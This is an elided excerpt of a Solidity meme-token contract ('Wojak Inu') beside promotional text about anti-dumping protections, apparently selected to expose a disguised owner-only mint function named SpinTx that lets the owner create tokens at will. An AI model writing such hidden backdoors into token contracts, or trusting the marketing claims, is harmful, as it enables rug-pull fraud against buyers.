...
With a dynamic sell limit based on price impact and increasing sell cooldowns and redistribution taxes on consecutive sells, v2 block bots and discourage dumping.
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function SpinTx(uint256 amount) public onlyOwner {

    _SpinTx(msg.sender, amount);
    ...
    function _SpinTx(address account, uint256 amount) internal virtual {
...
contract Woojakinu is ERC20 {
    ...
    constructor() public ERC20("Wojak Inu", "wojakinu") {

        _SpinTx(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
